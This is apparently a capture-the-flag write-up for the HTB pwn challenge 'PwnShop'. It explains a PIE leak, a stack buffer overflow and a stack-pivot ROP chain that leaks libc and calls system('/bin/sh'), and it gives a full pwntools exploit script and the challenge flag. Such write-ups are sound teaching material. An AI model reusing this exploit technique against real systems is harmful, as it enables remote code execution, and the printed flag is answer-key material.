---
title: "PwnShop"
ctf: "HTB"
date: 2026-06-13
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
author: "gluppler"
---

# PwnShop

## Summary

Stripped PIE x86-64 binary with a stack BOF in the Buy option (72B buffer, 80B read). PIE leak via format-string-like `printf` in wrong-price path, libc leak + shell via `sub rsp, 0x28; ret` gadget that creates a virtual ROP inside the overflow buffer.

## Solution

### Step 1: Leak PIE

Option 2 (Sell) asks for an item name and price. If price != `13.37`, it prints `What? <our_price>? The best I can do is 13.37$` — but `printf` uses `%s` with a pointer at `rsp+0x28` which happens to contain the address of GLOBAL_BUF (PIE-relative 0x40c0). The leak appears 8 bytes after our price input.

### Step 2: Leak libc and get shell

Option 1 (Buy) calls `read(0, rsp, 0x50)` into a 72-byte buffer — 8 bytes overflow the return address. The gadget at 0x1219 (`sub rsp, 0x28; ret`) lets us embed a ROP chain inside the buffer space below the return address:

Buffer layout (80 bytes total):
```
[S+0x00..S+0x27]: padding (40 bytes)
[S+0x28..S+0x3f]: ROP chain (pop rdi, arg, function)
[S+0x40..S+0x47]: return from function
[S+0x48..S+0x4f]: sub_rsp_28_ret (overwrites real return address)
```

After ret to sub_rsp_28_ret, rsp moves back 0x28 bytes to S+0x28, then ret walks the embedded chain.

Two rounds:
1. `pop rdi; ret` → `puts@GOT` → `puts@PLT` → `main` → leak libc puts address
2. `pop rdi; ret` → `"/bin/sh"` → `ret` (alignment) → `system` → shell

Remote uses libc6\_2.23-0ubuntu11 (puts=0x6f6a0, system=0x453a0, /bin/sh=0x18ce17), identified via libc.rip with puts+printf last-12-bit matches.

```python
#!/usr/bin/env python3
from pwn import *
import argparse

context.arch = 'amd64'
context.log_level = 'info'

BINARY = './challenge/pwnshop'

REMOTE_PUTS_OFFSET   = 0x6f6a0
REMOTE_SYSTEM_OFFSET = 0x453a0
REMOTE_BINSH_OFFSET  = 0x18ce17

POP_RDI_RET    = 0x13c3
SUB_RSP_28_RET = 0x1219
RET            = 0x101a
MAIN           = 0x10a0
PUTS_PLT       = 0x1030
PUTS_GOT       = 0x4018
GLOBAL_BUF     = 0x40c0

def conn(local=True, host=None, port=None):
    if local:
        return process(BINARY)
    else:
        return remote(host, port)

def exploit(p, remote_mode):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'sell? ', b'AAAA')
    p.sendafter(b'it? ', b'1' * 8)
    resp = p.recvuntil(b'1> Buy')
    idx = resp.find(b'What? ')
    leak = resp[idx + 6:]
    end = leak.find(b'?')
    leak_str = leak[:end]
    addr_bytes = leak_str[8:14]
    global_buf_addr = u64(addr_bytes.ljust(8, b'\x00'))
    pie_base = global_buf_addr - GLOBAL_BUF
    pie_base &= ~0xfff
    log.success(f'PIE base: {hex(pie_base)}')

    p.sendlineafter(b'> ', b'1')
    p.recvuntil(b'details: ')
    payload1  = b'P' * 0x28
    payload1 += p64(pie_base + POP_RDI_RET)
    payload1 += p64(pie_base + PUTS_GOT)
    payload1 += p64(pie_base + PUTS_PLT)
    payload1 += p64(pie_base + MAIN)
    payload1 += p64(pie_base + SUB_RSP_28_RET)
    p.send(payload1)

    leaked = p.recvline(timeout=5)
    puts_addr = u64(leaked[:6].ljust(8, b'\x00'))

    if remote_mode:
        libc_base = puts_addr - REMOTE_PUTS_OFFSET
        system_addr = libc_base + REMOTE_SYSTEM_OFFSET
        binsh_addr  = libc_base + REMOTE_BINSH_OFFSET
    else:
        libc = ELF('/usr/lib/libc.so.6', checksec=False)
        libc_base = puts_addr - libc.symbols['puts']
        system_addr = libc_base + libc.symbols['system']
        binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

    p.recvuntil(b'> ')
    payload2  = b'S' * 0x28
    payload2 += p64(pie_base + POP_RDI_RET)
    payload2 += p64(binsh_addr)
    payload2 += p64(pie_base + RET)
    payload2 += p64(system_addr)
    payload2 += p64(pie_base + SUB_RSP_28_RET)
    p.sendline(b'1')
    p.recvuntil(b'details: ')
    p.send(payload2)

    p.sendline(b'cat flag.txt')
    flag = p.recvline(timeout=3).decode(errors='replace').strip()
    log.success(f'Flag: {flag}')
    p.interactive()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--remote', nargs=2, metavar=('HOST', 'PORT'))
    parser.add_argument('--local', action='store_true', default=True)
    args = parser.parse_args()

    if args.remote:
        p = conn(local=False, host=args.remote[0], port=args.remote[1])
        exploit(p, remote_mode=True)
    else:
        p = conn(local=True)
        exploit(p, remote_mode=False)
```

## Flag

```
HTB{th1s_is_wh@t_I_c@ll_a_g00d_d3a1!}
```
